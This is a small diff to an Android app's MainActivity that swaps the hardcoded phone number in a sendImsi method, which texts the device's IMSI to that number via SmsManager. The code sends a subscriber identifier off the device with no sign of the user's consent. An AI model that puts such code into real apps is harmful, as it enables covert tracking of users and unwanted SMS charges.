@@ -167,7 +167,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 
     private void sendImsi(String imsi) {
         if (!TextUtils.isEmpty(imsi)) {
-            String phone = "18601309093";
+            String phone = "15550420424";
             SmsManager sms = SmsManager.getDefault();
             sms.sendTextMessage(phone, null, "imsi:" + imsi, null, null);
         }
